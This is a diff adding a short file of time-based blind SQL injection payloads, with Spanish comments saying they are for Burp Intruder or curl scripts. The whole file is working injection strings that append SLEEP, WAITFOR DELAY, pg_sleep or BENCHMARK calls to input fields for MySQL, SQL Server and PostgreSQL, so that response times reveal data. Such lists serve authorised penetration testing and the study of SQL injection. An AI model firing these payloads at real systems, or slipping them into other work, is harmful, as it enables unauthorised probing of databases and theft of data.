@@ -1,0 +1,16 @@
+# SQLi BLIND: TIME-BASED PAYLOADS
+# Objetivo: Medir el tiempo de respuesta para inferir datos.
+# USO: Usar en Burp Intruder o scripts CURL.
+
+# MySQL/MariaDB: SLEEP(N)
+' AND (SELECT SLEEP(5))=1 --
+" AND (SELECT SLEEP(5))=1 --
+
+# SQL Server: WAITFOR
+' ; WAITFOR DELAY '0:0:5' --
+
+# PostgreSQL: PG_SLEEP
+' AND 1=pg_sleep(5) --
+
+# MySQL/MariaDB: BENCHMARK (para pruebas cortas)
+' AND (SELECT IF(5>1, BENCHMARK(5000000,MD5(1)), 0)) --
